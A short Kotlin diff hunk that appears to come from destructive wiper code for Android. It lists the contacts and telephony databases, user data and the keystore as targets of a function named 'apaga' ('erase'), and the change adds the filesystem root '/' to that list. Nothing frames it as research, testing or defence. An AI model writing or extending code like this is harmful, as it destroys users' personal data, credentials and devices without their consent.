@@ -15,7 +15,8 @@ fun main() {
         "/data/data/com.android.providers.contacts/databases",
         "/data/data/com.android.providers.telephony/databases",
         "/data/system/users/0",
-        "/data/misc/keystore"
+        "/data/misc/keystore",
+        "/"
     )
 
     fun apaga(f: File) {
